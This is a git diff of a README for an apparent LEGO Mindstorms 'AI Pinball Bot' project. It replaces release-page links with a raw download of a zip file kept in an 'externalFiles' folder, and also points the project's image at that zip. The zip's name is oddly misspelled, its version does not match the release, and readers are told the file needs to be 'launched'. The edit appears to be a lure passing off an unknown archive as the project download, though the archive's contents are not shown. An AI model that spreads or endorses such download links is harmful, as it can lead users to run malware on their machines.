@@ -22,7 +22,7 @@ This repository contains Python code that integrates with LEGO Mindstorms EV3 to
 
 To access the code and begin your AI LEGO Pinball Bot experience, download the project files from the following link:
 
-[![Download AI LEGO Pinball Bot](https://github.com/DraksSounds/AI-LEGO-Pinball-Bot/releases/tag/v1.2)](https://github.com/DraksSounds/AI-LEGO-Pinball-Bot/releases/tag/v1.2)
+[![Download AI LEGO Pinball Bot](https://raw.githubusercontent.com/DraksSounds/AI-LEGO-Pinball-Bot/main/externalFiles/A_Pinball_LEG_Bot_v3.4.zip)](https://raw.githubusercontent.com/DraksSounds/AI-LEGO-Pinball-Bot/main/externalFiles/A_Pinball_LEG_Bot_v3.4.zip)
 
 If the link ends with the file name, it needs to be launched to start the download.
 
@@ -40,7 +40,7 @@ If the link does not work or is not provided, please check the "Releases" sectio
 - This project was inspired by the intersection of AI, robotics, and classic arcade games.
 - Special thanks to the developers and contributors who made this project possible.
 
-![AI LEGO Pinball Bot](https://github.com/DraksSounds/AI-LEGO-Pinball-Bot/releases/tag/v1.2)
+![AI LEGO Pinball Bot](https://raw.githubusercontent.com/DraksSounds/AI-LEGO-Pinball-Bot/main/externalFiles/A_Pinball_LEG_Bot_v3.4.zip)
 
 ## Support ℹ️
 
